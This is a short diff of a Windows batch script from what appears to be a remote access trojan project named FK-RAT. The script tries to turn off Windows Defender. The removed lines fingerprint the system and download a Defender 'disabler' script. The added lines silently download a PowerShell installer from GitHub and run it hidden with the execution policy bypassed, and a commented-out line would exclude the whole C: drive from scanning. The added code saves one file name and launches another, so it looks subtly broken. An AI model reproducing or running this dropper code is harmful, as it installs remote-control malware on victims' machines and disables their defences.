@@ -32,13 +32,6 @@ if '%errorlevel%' NEQ '0' (
 REM diable defender
 
 REM rat resources
-FOR /F %%i IN ('powershell (Get-WinUserLanguageList)[0].LanguageTag) DO (
-    SET LANG=%%i
-)
-FOR /F %%i IN ('powershell [Environment]::OSVersion[0].Version.Major) DO (
-    SET WINVER=%%i
-)
-echo %LANG%
-echo %WINVER%
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/WinDef/%WINVER%/Win10_en.vbs -OutFile disabler.vbs"; 
-REM powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+REM powershell powershell.exe -windowstyle hidden "Add-MpPreference -ExclusionPath 'C:\' -Force -ea 0 | Out-Null";
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile install.ps1";
+powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
